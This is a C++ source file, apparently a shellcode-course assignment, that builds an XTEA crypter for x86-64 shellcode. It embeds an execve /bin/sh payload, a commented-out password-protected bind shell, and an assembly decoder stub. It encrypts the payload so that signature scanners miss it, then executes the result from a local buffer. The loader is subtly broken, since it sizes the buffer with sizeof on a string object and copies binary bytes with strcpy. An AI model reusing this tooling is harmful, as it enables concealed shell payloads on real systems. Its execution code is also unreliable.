/*
 Author :      Demey Alexandre (PA-14186)
 Date :        11-06-2020
 
 Description : SLAE assignment #7 - (XTEA) Custom shellcode crypter
*/

#include <string>
#include <vector>
#include <cstdint>
#include <ctime>
#include <cstdlib>
#include <iostream>
#include <iomanip>
#include <cstring>

using namespace std;

// Exec shell payload
string payload = "\x31\xf6\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";

// Bind shell with pass from Assignment 1 (port 1337, pass L33tP4ss)
// Used to test the modification of the number of blocks pairs and of the encoded shellcode size
//string payload = "\x31\xff\xf7\xe7\xff\xc7\x89\xfe\xff\xc7\xb0\x29\x0f\x05\x89\xd3\x52\x66\x68\x05\x39\x66\x57\x89\xc7\x48\x89\xe6\xb2\x10\xb0\x31\x0f\x05\x89\xde\xb0\x32\x0f\x05\x99\xb0\x2b\x0f\x05\x97\x48\x89\xe6\xb2\x08\x89\xd8\x0f\x05\x48\x87\xfe\x48\xb8\x4c\x33\x33\x74\x50\x34\x73\x73\x48\xaf\x48\x87\xfe\x75\xe3\x89\xde\x31\xc0\x83\xc6\x03\xff\xce\xb0\x21\x0f\x05\x75\xf8\xb0\x3b\x53\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x89\xde\x99\x0f\x05";

// XTea decoder stub 
string stub = "\x48\x8d\x35\xf9\xff\xff\xff\x48\x83\xc6\x65\x4c\x8d\x5e\x18\x6a\x03\x59\x51\x41\xba\x40\x6e\xde\x8d\x56\xad\x93\xad\x93\x6a\x40\x59\x51\xb1\x03\x50\x50\x89\xc2\xc1\xe0\x04\xc1\xea\x05\x31\xd0\x5a\x01\xc2\x41\x52\x58\xff\xc9\x74\x03\xc1\xe8\x0b\x83\xe0\x03\x41\x8b\x04\x83\x44\x01\xd0\x31\xd0\x29\xc3\x58\xff\xc9\x78\x0a\x41\x81\xea\xb9\x79\x37\x9e\x93\xeb\xca\x59\x93\xe0\xc3\x5f\xab\x93\xab\x59\xe0\xad";

// Copy paste from : https://fr.wikipedia.org/wiki/XTEA#Article_connexe
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;
    for (i=0; i < num_rounds; i++) {
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
    }
    v[0]=v0; v[1]=v1;
}

// Copy paste from : https://fr.wikipedia.org/wiki/XTEA#Article_connexe
// Used to test before writing an asm x64 implementation
/*
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
    for (i=0; i < num_rounds; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
    }
    v[0]=v0; v[1]=v1;
}
*/

// Return a vector of blocks from the string passed in parameter
vector<uint32_t> getblocks (string s) {
    int nbblock = s.size() / 4;
    nbblock += (s.size()%4) > 0 ? 1: 0;
    s.resize(nbblock * 4);

    // Reverse each char of the same block
    string reverted = {};
    for(int i = 0; i < s.size(); i += 4){
        for(int j = i+3; j >= i; j--) 
            reverted += (unsigned char)s[j];
    }
    s = reverted;

    vector<uint32_t> lstblocks = {};

    // Change each 4 char into an uint32_t
    for(int i = 0; i < s.size(); i+=4) {
       lstblocks.push_back((uint32_t)(((unsigned char)s[i])<<24)
                            |(uint32_t)(((unsigned char)s[i+1])<<16)
                            |(uint32_t)(((unsigned char)s[i+2])<<8)
                            |(uint32_t)((unsigned char)s[i+3]));
    }
    return lstblocks; 
}

// Generate the 4 uint32_t to compose the Key
uint32_t * generatekey() {
    srand(time(0));
    static uint32_t key[] = {(uint32_t) rand(),(uint32_t) rand(),(uint32_t) rand(),(uint32_t) rand()};
    return key;
}

// Return a string where char of each block are in reverse order and print the hexadecimal value of the string
string blocks2hexa(string s) {
    string buffer = {};
    std::ios oldState(nullptr);
    oldState.copyfmt(std::cout);
    for(int i = 0; i < s.size(); i += 4){
        for(int j = i+3; j >= i; j--) {
            buffer += (unsigned char)s[j];
            cout << "\\x" << hex << setw(2) << setfill('0') << static_cast<uint32_t>((unsigned char)s[j]);
        }
    }
    cout << endl << endl;
    cout.copyfmt(oldState);
    return buffer;
}

int main() {

    vector<uint32_t> blocks = getblocks(payload);
    blocks.resize(blocks.size() + (blocks.size()%2));
    

    uint32_t *key = generatekey();
    string encoded = {};

    // Encipher the payload block pair by block pair
    // And store the result in the encoded string variable
    for(int i = 0; i < (blocks.size()-1); i+=2) {
        uint32_t currentblocks[2] = {blocks[i], blocks[i+1]};
        encipher(64, currentblocks, key);

        for(int j = 0; j < 2; j++) {
            for(int z = 24; z >=0; z-=8) {
                encoded += (unsigned char)((currentblocks[j] >> z) & 0xFF);
            }
        }
    }

    // Change the key from 4 uint32_t to a string of 16 char
    string strkey = {};
    for(int j = 0; j < 4; j++) {
        for(int z = 24; z >=0; z-=8) {
            strkey += (unsigned char)((key[j] >> z) & 0xFF);
        }
    }

    // Set number of blocks pairs and payload size
    stub[14] = (unsigned char)(encoded.size()&0xFF);
    stub[16] = (unsigned char)((blocks.size()/2)&0xFF);

    cout << "Key size : " << strkey.size() << endl;
    strkey = blocks2hexa(strkey);
    cout << "Encoded payload size : " << encoded.size() << endl;
    encoded = blocks2hexa(encoded);

    // Append stub + encoded payload + key
    stub += encoded;
    stub += strkey;

    cout << "XTEA Decoder stub + encoded payload + key size: " << stub.size() << endl;
    for(int i = 0; i < stub.size(); i++)
        cout << "\\x" << hex << setw(2) << setfill('0') << static_cast<uint32_t>((unsigned char)stub[i]);
    cout << endl << endl;
    
    // load then execute
    char shellcode[sizeof(stub)];
    strcpy(shellcode, stub.c_str());
    void (* run)() = (void (*)()) shellcode;
    run();
}


